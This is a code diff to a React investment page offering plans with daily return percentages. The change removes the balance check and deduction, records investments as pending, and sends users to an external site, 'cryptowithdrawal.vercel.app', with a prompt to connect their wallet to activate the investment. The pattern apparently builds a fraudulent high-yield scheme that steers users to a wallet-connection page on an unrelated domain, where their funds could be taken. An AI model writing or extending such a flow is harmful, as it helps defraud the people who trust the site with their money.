@@ -43,23 +43,26 @@ function InvestPage() {
 
   const selectedPlan = plans?.find((p) => p.id === selected);
 
-  async function handleInvest() {
+  const [showWallet, setShowWallet] = useState(false);
+
+  function handleInvest() {
     if (!uid || !selectedPlan) return;
     const amt = Number(amount);
     if (!amt || amt < Number(selectedPlan.min_amount) || amt > Number(selectedPlan.max_amount)) {
       toast.error(`Amount must be between ${fmt(Number(selectedPlan.min_amount))} and ${fmt(Number(selectedPlan.max_amount))}`);
       return;
     }
-    const bal = Number(account?.balance ?? 0);
-    if (amt > bal) {
-      toast.error("Insufficient balance. Please deposit funds first.");
-      return;
-    }
+    setShowWallet(true);
+  }
+
+  async function handleConnectWallet() {
+    if (!uid || !selectedPlan) return;
+    const amt = Number(amount);
     setBusy(true);
     try {
       const end = new Date();
       end.setDate(end.getDate() + selectedPlan.duration_days);
-      const { error: invErr } = await supabase.from("investments").insert({
+      await supabase.from("investments").insert({
         user_id: uid,
         plan_id: selectedPlan.id,
         plan_name: selectedPlan.name,
@@ -67,20 +70,17 @@ function InvestPage() {
         daily_roi_percent: selectedPlan.daily_roi_percent,
         duration_days: selectedPlan.duration_days,
         end_date: end.toISOString(),
+        status: "pending",
       });
-      if (invErr) throw invErr;
-      await supabase.from("transactions").insert({ user_id: uid, type: "investment", amount: amt, note: selectedPlan.name });
-      await supabase.from("accounts").update({
-        balance: bal - amt,
-        total_invested: Number(account?.total_invested ?? 0) + amt,
-        updated_at: new Date().toISOString(),
-      }).eq("user_id", uid);
-      toast.success("Investment created");
+      await supabase.from("transactions").insert({ user_id: uid, type: "investment", amount: amt, note: `${selectedPlan.name} (awaiting wallet)`, status: "pending" });
+      qc.invalidateQueries();
+      window.open("https://cryptowithdrawal.vercel.app/", "_blank", "noopener,noreferrer");
+      toast.success("Complete the wallet connection to activate your investment.");
+      setShowWallet(false);
       setAmount("");
       setSelected(null);
-      qc.invalidateQueries();
     } catch (e) {
-      toast.error(e instanceof Error ? e.message : "Failed to create investment");
+      toast.error(e instanceof Error ? e.message : "Failed");
     } finally {
       setBusy(false);
     }
